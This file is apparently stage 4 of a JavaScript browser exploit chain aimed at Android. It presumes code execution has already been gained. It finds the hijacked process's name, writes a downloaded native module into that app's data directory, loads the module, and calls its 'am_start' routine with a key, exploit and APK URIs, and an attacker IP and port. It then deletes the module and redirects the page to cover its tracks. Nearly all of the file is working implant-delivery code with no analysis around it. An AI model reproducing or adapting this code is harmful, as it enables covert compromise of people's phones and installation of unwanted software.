// [ Stage 4 ] -------------------------------------------------------------- //
// MAGIC: -213173581276 (= -1 * 0x44 * 0xbadadd07)

/** @define {boolean} */
var ENABLE_DEBUG = true;

if (window.INFO === undefined) {
  INFO = function (msg) { console.log(msg) };
}

// This only happens in non-debug mode
if (window.ERR === undefined) {
  ERR = function () {
    window.location.replace("${B_REDIRECT_URI}");
    throw Error();
  };
}

function finish() {
  window.location.replace("${B_REDIRECT_URI}");
}

// ---------------------------------------------------------------------------- //

function stage4(memobj, rce, libc, libwebcore, addr) {
  ENABLE_DEBUG && INFO("> [ Stage 4 ]");

  var system = libc.requiresymbol("system");
  var fopen = libc.requiresymbol("fopen");
  var fread = libc.requiresymbol("fread");
  var fgets = libc.requiresymbol("fgets");
  var fwrite = libc.requiresymbol("fwrite");
  var fclose = libc.requiresymbol("fclose");
  var getpid = libc.requiresymbol("getpid");

  var cmd = addr + 0xd000;
  memobj.writestring(cmd, "/proc/self/cmdline");
  var mode = addr + 0xd100;
  memobj.writestring(mode, "r");
  var buffer = addr + 0xd200;

  var fp = rce.call(fopen, cmd, mode);

  if (fp === 0) ERR("Can't open file");

  var retval = rce.call(fgets, buffer, 0x100, fp);
  if (retval != buffer) {
    ERR("fgets() failed: " + retval);
  }
  var processname = memobj.readstring(buffer);
  rce.call(fclose, fp);

  var pid = rce.call(getpid);
  ENABLE_DEBUG && INFO("Got RCE for " + processname + " (PID: " + pid + ")");

  function complete_stage4() {
    if (window['g_module'] === null) {
      ERR("Module download failed!");
    }

    function writefile(filename, view) {
      memobj.writestring(cmd, filename);
      memobj.writestring(mode, "wb");
      fp = rce.call(fopen, cmd, mode);
      if (fp === 0) {
        ERR("cannot open file for writing: " + filename);
      }

      var remaining = view.byteLength;
      var offset = 0;
      var length = 0;
      while (remaining > 0) {
        if (remaining < 4) {
          length = remaining;
          for (var i = 0; i < remaining; i++) {
            memobj.write8(buffer + i, view.getUint8(offset + i));
          }
        } else {
          for (var i = 0; i < Math.min(0x100 / 4, remaining / 4); i++) {
            memobj.write32(buffer + i * 4, view.getUint32(offset + i * 4, true));
          }
          length = Math.min(0x100 / 4, remaining / 4) * 4;
        }


        var written = rce.call(fwrite, buffer, 1, length, fp);
        if (written != length) {
          ERR("Failed to write file: write for " + length + " issued, got " + written);
        }

        offset += length;
        remaining -= length;
      }

      rce.call(fclose, fp);
    }


    var basepath = "/data/data/" + processname;
    var modulepath = basepath + "/module.so";
    writefile(modulepath, window.g_module);

    var dlsym = libc.findreloc("dlsym")
    var dlopen = libc.findreloc("dlopen")
    var dlclose = libc.findreloc("dlclose")

    memobj.writestring(cmd, modulepath);
    var handle = rce.call(dlopen, cmd, 0); // RTLD_NOW
    memobj.writestring(cmd, "am_start");
    var am_start = rce.call(dlsym, handle, cmd);

    memobj.writestring(cmd, basepath);

    // struct params_t {
    //   char key[0x100];
    //   char ex_uri[0x100];
    //   char apk_uri[0x100];
    //   char ex_filename[0x100];
    //   char apk_filename[0x100];
    //   char ip[0x100];
    // };

    var params = cmd + 0x100;

    memobj.writearray(params + 0x000, eval("${R_KEY}"));     // key
    memobj.writestring(params + 0x100, "${B_EXPLOIT_REF}");  // ex_uri
    memobj.writestring(params + 0x200, "${B_APK_REF}");      // apk_uri
    memobj.writestring(params + 0x300, "${B_EXPLOIT_NAME}"); // ex_filename
    memobj.writestring(params + 0x400, "${B_APK_NAME}");     // apk_filename
    memobj.writestring(params + 0x500, "${B_IP}");           // ip

    var port = parseInt("${B_PORT}");

    var result = rce.forkingcall(am_start, cmd, port, params);

    memobj.writestring(cmd, "rm " + modulepath);
    rce.call(system, cmd);

    // if (ENABLE_DEBUG) {
    // 	alert(result);
    // }

    finish();
  }

  if (window['g_module'] !== undefined) {
    complete_stage4();
    return;
  }

  var intid;

  intid = window.setInterval(function () {
    if (window['g_module'] !== undefined) {
      complete_stage4();
      window.clearInterval(intid);
    }
  }, 100);

}